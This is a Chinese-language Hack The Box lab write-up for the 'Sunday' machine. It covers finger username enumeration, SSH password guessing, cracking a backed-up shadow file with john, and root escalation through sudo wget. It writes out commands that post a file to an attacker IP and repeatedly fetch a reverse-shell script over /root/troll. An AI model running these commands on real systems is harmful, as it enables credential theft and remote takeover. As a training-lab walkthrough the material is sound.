### 阶段2.1：finger服务用户名枚举

https://pentestlab.blog/tag/finger/

![](../Images/350a657f13aeaf3ee73ef03c69e6e034.png)

随后根据字典枚举出存在记录的用户，组成一个新的用户字典，随后尝试 ssh 登录。

### 阶段2.2：用户名密码枚举

最终在多个密码尝试枚举失败后，尝试将用户名作为口令进行枚举，成功登录目标服务器：

![](../Images/821f696b9d2a07691dbaa04a2fc001b8.png)

口令组：`sunny:sunday`

在进行 ssh 登录时，提示：`找不到匹配的密钥交换方法`，通过google尝试添加 `-oKexAlgorithms=diffe-hellman-group-sha1` 解决。  
![](../Images/29f051699fd7372430fe644d8064908e.png)

### 阶段2.3：备份文件哈希破解

首先查看当前服务器中存在哪些可登录用户：

```
























sunny@sunday:~$ cat /etc/passwd
```

在尝试看看是否存在 sudo 配置枚举（`-l：列出目前用户可执行与无法执行的指令；`）。

```






sunny@sunday:~$ sudo -l
```

大当前用户可以用 sudo 去运行 `/root/troll`，看结果应该是打印了 `id` 命令的结果。

查看 linpeas 输入信息，整理思路：

![](../Images/67a438cb2ed829cc92a0986f2c27c566.png)

`sammy` 用户存在 ssh 登录痕迹。

![](../Images/74544d6fb113c801c19d93d8556abd12.png)存在一个不常见的 `/backup` 目录，且目录内容存在读取权限。  
![](../Images/5ea745c7f8414f524b54dd0e5ccf019a.png)

在 `shadow.backup` 目录中存在 `sammy、sunny` 用户的密码哈希：

```













sunny@sunday:/backup$ cat shadow.backup 
```

通过 john 工具进行哈希破解：

![](../Images/70efe44f3421ed6669f65f233fecee54.png)

两组哈希解出来了：

```

sunday           (?)
```

尝试切换到 `sammy` 用户，成功。

这里有一个小知识点，就是在 `$ su - sammy` 时，中间加 `-` 和不加是存在区别的。

![](../Images/7ba18d2f18a74d95e77a2ef33f5521ae.png)

```

```

## 阶段3：权限提升

![](../Images/1bc5e08e5d30bb40ec58d3c2b820b1df.png)

通过列举 sudo 的配置可以看到，当前用户运行免密已root身份执行`wget`

那么简单了，可以用 wget 做文件传递和读取。

如将 `agent22.backup` 内容发给远端：`sudo wget --post-file=/backup/agent22.backup http://10.10.16.246:9900`

![](../Images/9092c0362da633394f9fc6aef8a4ef7d.png)

同样的，直接读 `/root/root.txt` 可获得flag。

![](../Images/9e72b0f816274696cdef87581b62b80f.png)

如果是要获得一个反弹shell的话，则可以将msf的马通过wget输出到 `agent22.backup`。但这里在尝试的时候发现获取成功，但执行后还是输出老的内容。

![](../Images/7fadabb3141d7251e2b4facb6c3404c3.png)  
![](../Images/ad6ba68dbd5505950e3973f9fda6e004.png)尝试将替换 `-O` 参数的位置，也无效。  
![](../Images/e33ab9c5235de4c562f6703e31f8d53c.png)

最后想到的 Hackthebox 可能为了环境被人为破坏，可能加了定时任务去恢复文件这种东西。

尝试写一个条件竞争的bash，去和定时任务抢写入：`$ for i in $(seq 1 50); do sudo wget http://10.10.16.246/reverse.sh -O /root/troll; sleep 1; done`

成功获取到 root 的反弹shell。

![](../Images/e1f9d6c8360a6679d817ae2c8cb88822.png)
